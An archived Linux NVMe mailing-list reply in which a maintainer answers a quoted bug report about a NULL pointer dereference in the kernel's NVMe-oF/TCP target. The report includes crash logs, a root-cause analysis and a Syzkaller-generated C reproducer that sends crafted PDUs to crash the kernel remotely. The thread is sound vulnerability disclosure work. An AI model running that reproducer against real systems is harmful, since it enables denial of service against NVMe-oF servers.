Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id A5FB6C54E76
	for <linux-nvme@archiver.kernel.org>; Mon, 20 Nov 2023 10:50:32 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
	Content-Type:In-Reply-To:From:References:Cc:To:Subject:MIME-Version:Date:
	Message-ID:Reply-To:Content-ID:Content-Description:Resent-Date:Resent-From:
	Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
	bh=ztgXTSX1fFs8gSlnS3MUd56x2wEXRWT9XEgAbk7bP3k=; b=mOkO4QHr4QtEztZEMY6TiXILfK
	zeGjm6BQbLydfof8JwvNz1TqMuVHl1y8a/wKDfmqNvU7Ys2dQZpH9RAXEbL1ZKj9zEYjFY/kYDbKc
	5CFe0HDEaMG7aou6/qhmVvp9VOJT/WCjyNlxxiDdUN6TboLOeUjnK+NYaho1u2bG5JZDs5Yz8xKW+
	ZnlqLfZsB02i2A3FXXZH6QSvyu9cL0211n5yBEnh/PaTJ5/Sgcvyv41babQ5XFRGkxX0TEy9mGy7H
	AlTji4KuR2oJCfIRKTjHkXLNBX6CfLxfUMESPqI2raK4SpeseEaeAg/iv5lpQFX6SuwgQySEf6U+0
	LmPlXVAg==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1r51rI-00Bp6P-1D;
	Mon, 20 Nov 2023 10:50:28 +0000
Received: from mail-ej1-f50.google.com ([209.85.218.50])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1r51rC-00Bp5l-1f
	for linux-nvme@lists.infradead.org;
	Mon, 20 Nov 2023 10:50:24 +0000
Received: by mail-ej1-f50.google.com with SMTP id a640c23a62f3a-9fde616b008so16302066b.1
        for <linux-nvme@lists.infradead.org>; Mon, 20 Nov 2023 02:50:22 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1700477421; x=1701082221;
        h=content-transfer-encoding:in-reply-to:from:references:cc:to
         :content-language:subject:user-agent:mime-version:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=ztgXTSX1fFs8gSlnS3MUd56x2wEXRWT9XEgAbk7bP3k=;
        b=dUHQZE11zTT7VBkdFLEVuPnaZTidph0/eZSqnFcNdWLXcWZPXjP4l38NRedLLjbOfp
         HFQ/wgpfWlNjdwhE8fkfE9U91Pi1vvQftM7Yu6UfRCSCOIHwMI5uJrJ5FGxagdIxKtTP
         o8dW4u2l3Jbc9ihZsbWGkpqpArIIx7+rCMssIRobfHSwbxG8XVyvJnwzEmBMWc+I+909
         JW9e4vaRKkxo0tTYyFiEFoFOLGXGkFlDzHLadAxr6SNGDy7JShXV04gU6vPKwWkkRfQ6
         XCgU2N+N02UJrxG0VajuDuKOMpe7BFZL7NGJ4CrsvYLDrymvr9OYZ4a2uXZjjnyvODXz
         xBJg==
X-Gm-Message-State: AOJu0YwrQFSijOvy95xYm75iXgK8MmavFdYrr8TIiLDdGMgu3LBos7DD
	P4iKCR2xfNjGkqUnPIbBfD0=
X-Google-Smtp-Source: AGHT+IHMTVpvE+mZlVa3lRcoRgojpw68w0Sld8ZxzAUZM7i+7sVHlT2+QGo8RM4x5yt1g/6Jl1UKEA==
X-Received: by 2002:a17:906:10cf:b0:9e6:dfee:8154 with SMTP id v15-20020a17090610cf00b009e6dfee8154mr4509457ejv.3.1700477420832;
        Mon, 20 Nov 2023 02:50:20 -0800 (PST)
Received: from [192.168.64.177] (bzq-219-42-90.isdn.bezeqint.net. [62.219.42.90])
        by smtp.gmail.com with ESMTPSA id m23-20020a1709062ad700b0099297782aa9sm3743631eje.49.2023.11.20.02.50.19
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 20 Nov 2023 02:50:20 -0800 (PST)
Message-ID: <d972c5e5-523a-4b9a-83d5-ff8a1604139f@grimberg.me>
Date: Mon, 20 Nov 2023 12:50:19 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in
 `nvmet_tcp_build_iovec`
Content-Language: en-US
To: Alon Zahavi <zahavi.alon@gmail.com>, linux-nvme@lists.infradead.org
Cc: Chaitanya Kulkarni <chaitanyak@nvidia.com>, Christoph Hellwig <hch@lst.de>
References: <CAK5usQv0opo1n6VyysRD28VnML-V8tMD1YbZPUSJxth0gXR=SQ@mail.gmail.com>
 <CAK5usQtW2SNSjQpMWyvGVhVjU-y4cdjEn4DrA5xx2R-hjscn5g@mail.gmail.com>
From: Sagi Grimberg <sagi@grimberg.me>
In-Reply-To: <CAK5usQtW2SNSjQpMWyvGVhVjU-y4cdjEn4DrA5xx2R-hjscn5g@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231120_025022_553940_799D76F4 
X-CRM114-Status: GOOD (  29.45  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org



On 11/15/23 11:35, Alon Zahavi wrote:
> Just sending another reminder for this issue.
> Until a fix for this there is a remote DoS that can be triggered.
> 
> On Mon, 6 Nov 2023 at 15:40, Alon Zahavi <zahavi.alon@gmail.com> wrote:
>>
>> # Bug Overview
>>
>> ## The Bug
>> A null-ptr-deref in `nvmet_tcp_build_iovec`.
>>
>> ## Bug Location
>> `drivers/nvme/target/tcp.c` in the function `nvmet_tcp_build_iovec`.
>>
>> ## Bug Class
>> Remote Denial of Service
>>
>> ## Disclaimer:
>> This bug was found using Syzkaller with NVMe-oF/TCP added support.
>>

Hey Alon, thanks for the report.

>> # Technical Details
>>
>> ## Kernel Report - NULL Pointer Dereference
>> ```
>> [  157.833470] BUG: kernel NULL pointer dereference, address:
>> 000000000000000c
>> [  157.833478] #PF: supervisor read access in kernel mode
>> [  157.833484] #PF: error_code(0x0000) - not-present page
>> [  157.833490] PGD 126e40067 P4D 126e40067 PUD 130d16067 PMD 0
>> [  157.833506] Oops: 0000 [#1] PREEMPT SMP NOPTI
>> [  157.833515] CPU: 3 PID: 3067 Comm: kworker/3:3H Kdump: loaded Not
>> tainted 6.5.0-rc1+ #5
>> [  157.833525] Hardware name: VMware, Inc. VMware Virtual
>> Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
>> [  157.833532] Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
>> [  157.833546] RIP: 0010:nvmet_tcp_build_pdu_iovec+0x7a/0x120
>> [  157.833558] Code: fe 44 89 a3 20 02 00 00 49 c1 e4 05 4c 03 63 30
>> 4c 89 75 d0 41 89 c6 e8 34 b8 18 ff 45 85 ff 0f 84 99 00 00 00 e8 06
>> bd 18 ff <41> 8b 74 24 0c 41 8b 44 24 08 4c 89 e7 49 8b 0c 24 89 f2 41
>> 89 75
>> [  157.833568] RSP: 0018:ffffc9001ab83c28 EFLAGS: 00010293
>> [  157.833576] RAX: 0000000000000000 RBX: ffff88812b9583e0 RCX: 0000000000000000
>> [  157.833584] RDX: ffff888131b10000 RSI: ffffffff82191dda RDI: ffffffff82191dcc
>> [  157.833591] RBP: ffffc9001ab83c58 R08: 0000000000000005 R09: 0000000000000000
>> [  157.833598] R10: 0000000000000007 R11: 0000000000000000 R12: 0000000000000000
>> [  157.833605] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000007
>> [  157.833612] FS:  0000000000000000(0000) GS:ffff888233f80000(0000)
>> knlGS:0000000000000000
>> [  157.833630] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>> [  157.833638] CR2: 000000000000000c CR3: 0000000122dd4002 CR4: 00000000007706e0
>> [  157.833659] PKRU: 55555554
>> [  157.833686] Call Trace:
>> [  157.833691]  <TASK>
>> [  157.833712]  ? show_regs+0x6e/0x80
>> [  157.833745]  ? __die+0x29/0x70
>> [  157.833757]  ? page_fault_oops+0x278/0x740
>> [  157.833784]  ? up+0x3b/0x70
>> [  157.833835]  ? do_user_addr_fault+0x63b/0x1040
>> [  157.833846]  ? __sanitizer_cov_trace_const_cmp4+0x1a/0x20
>> [  157.833862]  ? irq_work_queue+0x95/0xc0
>> [  157.833874]  ? exc_page_fault+0xcf/0x390
>> [  157.833889]  ? asm_exc_page_fault+0x2b/0x30
>> [  157.833925]  ? nvmet_tcp_build_pdu_iovec+0x7a/0x120
>> [  157.833958]  ? nvmet_tcp_build_pdu_iovec+0x6c/0x120
>> [  157.833971]  ? nvmet_tcp_build_pdu_iovec+0x7a/0x120
>> [  157.833998]  ? nvmet_tcp_build_pdu_iovec+0x7a/0x120
>> [  157.834011]  nvmet_tcp_try_recv_pdu+0x995/0x1310
>> [  157.834066]  nvmet_tcp_io_work+0xe6/0xd90
>> [  157.834081]  process_one_work+0x3da/0x870
>> [  157.834112]  worker_thread+0x67/0x640
>> [  157.834124]  kthread+0x164/0x1b0
>> [  157.834138]  ? __pfx_worker_thread+0x10/0x10
>> [  157.834148]  ? __pfx_kthread+0x10/0x10
>> [  157.834162]  ret_from_fork+0x29/0x50
>> [  157.834180]  </TASK>
>> ```
>>
>> ## Description
>>
>> ### Tracing The Bug
>> As written above, the bug occurs during the execution of
>> nvmet_tcp_build_iovec. Looking at the kernel logs report we can see
>> the exact line of code that triggers the bug.
>>
>> Code Block 1:
>> ```
>> static void nvmet_tcp_build_pdu_iovec(struct nvmet_tcp_cmd *cmd)
>> {
>>    ...
>>    sg = &cmd->req.sg[cmd->sg_idx]; // #1
>>
>>    while (length) {
>>      u32 iov_len = min_t(u32, length, sg->length - sg_offset); // #2
>>    ...
>>    }
>> ...
>> }
>> ```
>> Breakdown:
>>
>> 1. The variable `sg` is getting the value of  `&cmd->req.sg[cmd->sg_idx]`.
>> At the assembly level (intel flavor):
>> ```
>> mov    DWORD PTR [rbx+0x220], r12d     ; r12 holds the `cmd` address
>> add    r12, QWORD PTR [rbx+0x30]          ; adding the value of
>> `req.sg[cmd->sg_idx]`
>> ```
>>
>> However, `cmd->req.sg` is NULL at this point of execution thus `sg`
>> will point to `0 + cmd->sg_idx`, which will most likely be either 0x0
>> or 0x1, a non-accessible memory addresses.
>>
>> 2. After moving the address into `sg` the driver will dereference it
>> later, inside the while loop.
>> ```
>> mov    esi, DWORD PTR [r12+0xc]
>> ```
>> When getting here, `r12` will point into (probably) 0x0. This means
>> that the CPU will try to access the memory address 0xC and will
>> trigger a NULL pointer dereference.
>>
>>
>> ## Root Cause
>> `req` is initialized during `nvmet_req_init`. However, the sequence
>> that leads into `nvmet_tcp_build_iovec` does not contain any call for
>> `nvmet_req_init`, thus crashing the kernel with NULL pointer
>> dereference. This flow of execution can also create a situation where
>> an uninitialized memory address will be dereferenced, which has
>> undefined behaviour.

If req->sg was not allocated, we shouldn't build a corresponding iovec.
There is a case where we encounter a failure where nvmet_req_init is
not called, but instead nvmet_tcp_handle_req_failure is called and
should properly initialize req->sg and the corresponding iovec.

The intention is to drain the error request from the socket, or at
least attempt to do so so the connection recovers.

I'd be interested to know if this path (nvmet_tcp_handle_req_failure)
is taken or there is something else going on....

>>
>> ## Reproducer
>> I am adding a reproducer generated by Syzkaller with some
>> optimizations and minor changes.
>>
>> ```
>> // autogenerated by syzkaller (https://github.com/google/syzkaller)
>>
>> #define _GNU_SOURCE
>>
>> #include <endian.h>
>> #include <errno.h>
>> #include <fcntl.h>
>> #include <sched.h>
>> #include <stdarg.h>
>> #include <stdbool.h>
>> #include <stdint.h>
>> #include <stdio.h>
>> #include <stdlib.h>
>> #include <string.h>
>> #include <sys/mount.h>
>> #include <sys/prctl.h>
>> #include <sys/resource.h>
>> #include <sys/stat.h>
>> #include <sys/syscall.h>
>> #include <sys/time.h>
>> #include <sys/types.h>
>> #include <sys/wait.h>
>> #include <unistd.h>
>>
>> #include <linux/capability.h>
>>
>> uint64_t r[1] = {0xffffffffffffffff};
>>
>> void loop(void)
>> {
>>    intptr_t res = 0;
>>    res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
>>    if (res != -1)
>>      r[0] = res;
>>    *(uint16_t*)0x20000100 = 2;
>>    *(uint16_t*)0x20000102 = htobe16(0x1144);
>>    *(uint32_t*)0x20000104 = htobe32(0x7f000001);
>>    syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
>>    *(uint8_t*)0x200001c0 = 0;
>>    *(uint8_t*)0x200001c1 = 0;
>>    *(uint8_t*)0x200001c2 = 0x80;
>>    *(uint8_t*)0x200001c3 = 0;
>>    *(uint32_t*)0x200001c4 = 0x80;
>>    *(uint16_t*)0x200001c8 = 0;
>>    *(uint8_t*)0x200001ca = 0;
>>    *(uint8_t*)0x200001cb = 0;
>>    *(uint32_t*)0x200001cc = 0;
>>    memcpy((void*)0x200001d0,
>>           "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>>           "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>>           "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35"
>>           "\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86"
>>           "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>>           "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>>           "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86",
>>           112);
>>    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
>>            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>>    *(uint8_t*)0x20000080 = 6;
>>    *(uint8_t*)0x20000081 = 3;
>>    *(uint8_t*)0x20000082 = 0x18;
>>    *(uint8_t*)0x20000083 = 0x1c;
>>    *(uint32_t*)0x20000084 = 2;
>>    *(uint16_t*)0x20000088 = 0x5d;
>>    *(uint16_t*)0x2000008a = 3;
>>    *(uint32_t*)0x2000008c = 0;
>>    *(uint32_t*)0x20000090 = 7;
>>    memcpy((void*)0x20000094, "\x83\x9e\x4f\x1a", 4);
>>    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x20000080ul, /*len=*/0x80ul,
>>            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>> }
>> int main(void)
>> {
>>    syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>    syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
>>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>    syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>    loop();
>>    return 0;
>> }
>> ```
>>
>> ### More information
>> When trying to reproduce the bug, this bug sometimes changes from a
>> null-ptr-deref into OOM (out of memory) panic.
>> This implies that there might be another memory corruption that also
>> happens before the dereferencing of NULL. I couldn't find the root
>> cause for the OOM bug. However, I am attaching the kernel log for that
>> bug below.
>> ```
>> [    2.075100] Out of memory and no killable processes...
>> [    2.075107] Kernel panic - not syncing: System is deadlocked on memory
>> [    2.075303] CPU: 0 PID: 22 Comm: kworker/u2:1 Not tainted 6.5.0-rc1+ #5
>> [    2.075428] Hardware name: VMware, Inc. VMware Virtual
>> Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
>> [    2.075608] Workqueue: eval_map_wq tracer_init_tracefs_work_func
>> [    2.075733] Call Trace:
>> [    2.075786]  <TASK>
>> [    2.075836]  dump_stack_lvl+0xaa/0x110
>> [    2.075921]  dump_stack+0x19/0x20
>> [    2.075997]  panic+0x567/0x5b0
>> [    2.076075]  ? out_of_memory+0xb01/0xb10
>> [    2.076167]  out_of_memory+0xb0d/0xb10
>> [    2.076272]  __alloc_pages+0xe87/0x1220
>> [    2.076358]  ? mark_held_locks+0x4d/0x80
>> [    2.076467]  alloc_pages+0xd7/0x200
>> [    2.076552]  allocate_slab+0x37e/0x500
>> [    2.076636]  ? mark_held_locks+0x4d/0x80
>> [    2.076726]  ? __sanitizer_cov_trace_const_cmp4+0x1a/0x20
>> [    2.076806]  ___slab_alloc+0x9c6/0x1250
>> [    2.076806]  ? __d_alloc+0x3d/0x2f0
>> [    2.076806]  kmem_cache_alloc_lru+0x45e/0x5d0
>> [    2.076806]  ? kmem_cache_alloc_lru+0x45e/0x5d0
>> [    2.076806]  ? __d_alloc+0x3d/0x2f0
>> [    2.076806]  __d_alloc+0x3d/0x2f0
>> [    2.076806]  ? __d_alloc+0x3d/0x2f0
>> [    2.076806]  d_alloc_parallel+0x75/0x1040
>> [    2.076806]  ? lockdep_init_map_type+0x50/0x240
>> [    2.076806]  __lookup_slow+0xf4/0x2a0
>> [    2.076806]  lookup_one_len+0xde/0x100
>> [    2.076806]  start_creating+0xaf/0x180
>> [    2.076806]  tracefs_create_file+0xa2/0x260
>> [    2.076806]  trace_create_file+0x38/0x70
>> [    2.076806]  event_create_dir+0x4c0/0x6e0
>> [    2.076806]  __trace_early_add_event_dirs+0x57/0x100
>> [    2.076806]  event_trace_init+0xe4/0x160
>> [    2.076806]  tracer_init_tracefs_work_func+0x15/0x440
>> [    2.076806]  process_one_work+0x3da/0x870
>> [    2.076806]  worker_thread+0x67/0x640
>> [    2.076806]  kthread+0x164/0x1b0
>> [    2.076806]  ? __pfx_worker_thread+0x10/0x10
>> [    2.076806]  ? __pfx_kthread+0x10/0x10
>> [    2.076806]  ret_from_fork+0x29/0x50
>> [    2.076806]  </TASK>
>> [    2.076806] ---[ end Kernel panic - not syncing: System is
>> deadlocked on memory ]---
>> ```
>> In case you found out what caused the OOM, please let me know.
>>
>> ## About this report
>> This report is almost identical to another report I sent to you, with
>> the title "[Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in
>> __nvmet_req_complete". The root cause seems to be the same, and both
>> bugs sometimes cause OOM kernel panic. If you think those bugs should
>> be addressed as one, please let me know.

